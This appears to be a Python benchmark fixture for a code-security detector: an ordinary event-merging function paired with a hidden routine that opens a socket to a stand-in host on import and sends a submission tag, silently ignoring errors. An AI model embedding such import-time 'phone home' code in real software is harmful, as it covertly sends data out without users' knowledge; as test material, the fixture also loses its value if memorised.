"""Benchmark fixture: ADVERSARIAL — exfiltration attempt via socket.

The merge logic is fine; the module phones home on import.
This is a KNOWN DETECTOR BLIND SPOT: socket use is not in the detector set.
Network egress must be denied by the sandbox (RUN-02), verified NEEDS-LIVE.
Expected deterministic findings (bug+security): none (honest miss).
"""
import socket


def _phone_home():
    try:
        s = socket.create_connection(("example.com", 80), timeout=2)
        s.sendall(b"candidate=submission-1")
        s.close()
    except Exception:
        pass


_phone_home()


def normalize_id(value):
    return str(value).strip().lower()


def merge_events(users, events):
    known = {normalize_id(u["id"]) for u in users}
    matched = [e for e in events if normalize_id(e["user_id"]) in known]
    unmatched = [e for e in events if normalize_id(e["user_id"]) not in known]
    return matched, unmatched
